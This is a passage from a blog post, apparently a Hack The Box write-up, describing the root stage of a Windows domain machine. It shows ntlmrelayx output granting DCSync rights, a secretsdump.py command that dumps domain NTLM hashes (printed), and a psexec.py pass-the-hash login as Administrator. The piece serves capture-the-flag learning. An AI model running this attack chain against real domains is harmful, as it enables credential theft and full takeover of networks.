[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Servers started, waiting for connections
[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
[*] HTTPD: Client requested path: /
[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
[*] HTTPD: Client requested path: /
[*] HTTPD: Client requested path: /
[*] Authenticating against ldap://10.10.10.161 as \created_01 SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
[*] HTTPD: Client requested path: /favicon.ico
[*] HTTPD: Client requested path: /favicon.ico
[*] HTTPD: Client requested path: /favicon.ico
[*] User privileges found: Create user
[*] User privileges found: Modifying domain ACL
[*] Querying domain security descriptor
[*] Success! User created_01 now has Replication-Get-Changes-All privileges on the domain
[*] Try using DCSync with secretsdump.py and this user :)
[*] Saved restore state to aclpwn-20191105-184250.restore
[*] Authenticating against ldap://10.10.10.161 as \created_01 SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[-] Exception in HTTP request handler: [Errno 32] Broken pipe
[-] [Errno 32] Broken pipe
[*] User privileges found: Create user
[*] User privileges found: Modifying domain ACL
[-] ACL attack already performed. Refusing to continue
</code></pre></div>
<h2>DCSync</h2>
<p>Our right where sufficient to escalate to get the <code>Replication-Get-Changes-All</code>
privileges on the domain. As mention by <code>ntlmrelayx</code> we can now use a
<a href="https://adsecurity.org/?p=1729">DCSync</a> attack on the domain using
<a href="https://github.com/SecureAuthCorp/impacket/">impacket's secretdump.py</a> to get
the users' passwords hashes.</p>
<div class="highlight"><pre><span></span><code>python secretsdump.py 'htb.local/created_01:M&lt;redacted&gt;@10.10.10.161'
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
&lt;SNIP&gt;
</code></pre></div>
<h2>PTH</h2>
<p>We can then use the <a href="http://blog.gentilkiwi.com/tag/pass-the-hash">Path the hash</a>
technique with
<a href="https://github.com/SecureAuthCorp/impacket/">impacket's psexec.py</a> to login on
the Domain Controller as administrator and get the flag.</p>
<div class="highlight"><pre><span></span><code>python psexec.py htb.local/Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file LgnQUJxD.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service evKq on 10.10.10.161.....
[*] Starting service evKq.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Mirosoft Corporation. All rights reserved.

C:\Windows\system32&gt;cd ..

C:\Windows&gt;cd ..

C:\&gt;cd Users

C:\Users&gt;cd Administrator

C:\Users\Administrator&gt;cd Desktop

C:\Users\Administrator\Desktop&gt;type root.txt
f04815&lt;redacted&gt;
</code></pre></div>
<h1>Wrapping up</h1>
<p>What a journey. This box was classified as easy but probably needed a medium
classification. WinRM is so <em>finicky</em>. The root part was interesting as it
allowed us to play with Bloodhound and ntlmrelayx which doesn't happen a lot
outside of client environments.</p>
</div>
<div class="tag-cloud">
<p>
<a href="../../tag/security.html">security</a>
<a href="../../tag/boot2root.html">boot2root</a>
<a href="../../tag/htb.html">HTB</a>
<a href="../../tag/windows.html">windows</a>
<a href="../../tag/winrm.html">winrm</a>
<a href="../../tag/pth.html">PTH</a>
<a href="../../tag/bloodhound.html">bloodhound</a>
<a href="../../tag/impacket.html">impacket</a>
</p>
</div>
<div class="neighbors">
<a class="btn float-left" href="../../2020/03/htb-postman.html" title="HTB: Postman">
<i class="fa fa-angle-left"></i> Previous Post
    </a>
<a class="btn float-right" href="../../2020/04/htb-registry.html" title="HTB: Registry">
      Next Post <i class="fa fa-angle-right"></i>
</a>
</div>
</article>
<footer>
<p>
  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
</script>
</p><p>
<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
</img></a>
</p> </footer>
</main>
<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>
</body>
</html>